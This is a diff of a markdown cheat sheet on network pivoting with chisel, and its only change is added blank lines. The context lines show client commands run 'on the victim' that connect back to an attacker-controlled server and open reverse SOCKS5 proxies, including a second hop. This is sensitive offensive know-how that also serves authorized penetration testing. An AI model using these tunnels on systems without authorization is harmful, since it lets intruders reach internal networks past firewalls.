@@ -29,6 +29,7 @@ On the victim:
 chisel client <SERVER_IP>:8080 R:socks
 ```
 - `R:socks` — creates a SOCKS5 proxy on the server.
+
 **When to use?**
 - Need a **fast SOCKS proxy** without complex configuration.
 - Traffic should go **via HTTP/HTTPS** (for example, if SSH is blocked).
@@ -48,6 +49,7 @@ chisel server -v --port 8080 --reverse --auth user:pass
 ./chisel client -v --auth user:pass 1.1.1.1:8080 R:1080:socks
 ```
 - `R:1080:socks`: create a SOCKS5 proxy on port 1080 Kali, connecting to the chisel server on port 8080.
+
 **Checking:**
 ```
 curl --socks5-hostname 127.0.0.1:1080 socks5://10.0.0.5
@@ -61,6 +63,7 @@ Via the first hop SOCKS proxy (10.0.0.5:1080)
 ```
 - `--proxy`: use the first hop proxy
 - `R:1081:socks`: new port 1081 on Kali for 2nd hop
+
 **Check:**
 ```
 curl --socks5-hostname 127.0.0.1:1081 socks5://192.168.1.10
